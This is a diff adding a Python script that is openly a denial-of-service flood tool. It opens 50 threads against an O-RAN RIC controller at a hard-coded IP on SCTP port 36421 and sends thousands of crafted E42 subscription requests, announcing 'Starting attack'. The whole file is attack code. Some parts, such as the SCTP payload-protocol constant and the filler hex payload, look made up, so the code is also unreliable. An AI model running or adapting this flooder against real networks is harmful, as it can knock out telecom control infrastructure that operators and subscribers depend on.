@@ -1,0 +1,75 @@
+#!/usr/bin/env python3
+import sys
+import socket
+import sctp
+import time
+import threading
+
+# Configuration
+RIC_IP = "10.9.71.235"
+RIC_PORT = 36421
+THREAD_COUNT = 50
+REQUESTS_PER_THREAD = 1000
+FLOOD_DELAY = 0.001
+
+# E42 Subscription Request template
+E42_SUB_REQ = bytes.fromhex(
+    "0015000a00000001000000010002000100030004000100050006"
+    "000700080009000a000b000c000d000e000f0010001100120013"
+    "001400150016001700180019001a001b001c001d001e001f0020"
+)
+
+def flood_worker(thread_id):
+    try:
+        # Create SCTP socket with correct configuration
+        sock = sctp.sctpsocket_tcp(socket.AF_INET)
+        sock.setblocking(False)  # Non-blocking mode
+        
+        # Connect with explicit association
+        sock.connect_ex((RIC_IP, RIC_PORT))
+        
+        # Modified payload
+        payload = bytearray(E42_SUB_REQ)
+        payload[12:16] = b"\x00\x01\x00\x02"
+        
+        for i in range(REQUESTS_PER_THREAD):
+            try:
+                sock.sctp_send(
+                    payload,
+                    ppid=sctp.PPID_E42_RIC_SUBSCRIPTION_REQ,
+                    flags=0
+                )
+                if i % 100 == 0:
+                    print(f"[Thread {thread_id}] Sent {i} requests")
+                time.sleep(FLOOD_DELAY)
+            except (BlockingIOError, OSError):
+                time.sleep(0.01)
+            except Exception as e:
+                print(f"[Thread {thread_id}] Error: {str(e)}")
+                break
+                
+    except Exception as e:
+        print(f"[Thread {thread_id}] Failed: {str(e)}")
+    finally:
+        try:
+            sock.close()
+        except:
+            pass
+
+def main():
+    print(f"Starting attack on {RIC_IP}:{RIC_PORT}")
+    threads = []
+    for i in range(THREAD_COUNT):
+        t = threading.Thread(target=flood_worker, args=(i,))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nStopping attack...")
+        
+if __name__ == "__main__":
+    main()
